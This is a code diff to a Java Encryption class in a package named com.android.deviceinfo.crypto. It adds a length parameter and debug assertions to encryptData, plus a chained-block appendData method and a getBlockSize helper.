@@ -11,6 +11,7 @@ package com.android.deviceinfo.crypto;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Utils;
 
 // TODO: Auto-generated Javadoc
 
@@ -244,7 +245,7 @@ public class Encryption {
 	 * @return the byte[]
 	 */
 	public byte[] encryptData(final byte[] plain) {
-		return encryptData(plain, 0);
+		return encryptData(plain, 0, plain.length);
 	}
 
 	/**
@@ -254,11 +255,12 @@ public class Encryption {
 	 *            the plain
 	 * @param offset
 	 *            the offset
+	 * @param len 
 	 * @return the byte[]
 	 */
-	public byte[] encryptData(final byte[] plain, final int offset) {
+	public byte[] encryptData(final byte[] plain, final int offset, int len) {
 
-		final int len = plain.length - offset;
+		if (Cfg.DEBUG) { Check.asserts(len > 0, " (encryptData) Assert failed, zero len"); }
 
 		// TODO: optimize, non creare padplain, considerare caso particolare
 		// ultimo blocco
@@ -273,14 +275,33 @@ public class Encryption {
 			crypted = crypto.encrypt(padplain);
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (decryptData) Error: " + e1);
+				Check.log(TAG + " (encryptData) Error: " + e1);
 			}
 		} 
 
+		if (Cfg.DEBUG) { Check.asserts(crypted!=null, " (encryptData) Assert failed, no crypted"); }
 		return crypted;
 	}
 
+	public byte[] appendData(byte[] plain, int offset, int len, byte[] lastBlock) {
+		final byte[] padplain = pad(plain, offset, len);
+		final int clen = padplain.length;
 
+		if (Cfg.DEBUG) {
+			Check.asserts(clen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
+		}
+		byte[] crypted=null;
+		try {
+			crypted = crypto.encrypt(padplain, offset, lastBlock);
+		} catch (Exception e1) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (appendData) Error: " + e1);
+			}
+		} 
+
+		System.arraycopy(crypted, crypted.length - getBlockSize(), lastBlock, 0, getBlockSize());
+		return crypted;
+	}
 
 	/**
 	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
@@ -345,6 +366,10 @@ public class Encryption {
 		for (int i = 0; i < 16; i++) {
 			pt[i] ^= iv[i];
 		}
+	}
+
+	public int getBlockSize() {
+		return 16;
 	}
 
 }
